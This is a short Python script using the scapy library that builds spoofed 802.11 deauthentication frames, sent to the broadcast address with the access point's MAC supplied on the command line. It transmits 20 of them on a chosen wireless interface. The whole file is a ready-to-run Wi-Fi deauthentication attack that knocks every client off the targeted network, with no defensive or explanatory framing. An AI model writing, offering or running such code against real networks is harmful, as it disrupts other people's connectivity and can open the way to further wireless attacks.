from scapy.all import *
import sys

frame = RadioTap()/Dot11(type=0, subtype=12, addr1='ff:ff:ff:ff:ff:ff', addr2=sys.argv[2], addr3=sys.argv[2])/Dot11Deauth(reason=7)

sendp(frame, iface=sys.argv[1], inter=0.1, count=20)
